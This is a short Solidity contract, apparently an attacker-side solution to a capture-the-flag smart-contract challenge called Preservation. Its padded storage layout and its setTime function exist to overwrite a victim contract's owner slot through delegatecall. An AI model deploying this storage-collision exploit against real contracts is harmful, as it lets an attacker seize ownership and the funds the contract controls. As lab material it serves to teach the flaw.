// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackPreservation {

    address public dontCare1;
    address public dontCare2;
    address public owner;

    function setTime(uint _owner) public {
        owner = address(uint160(_owner));
    }
}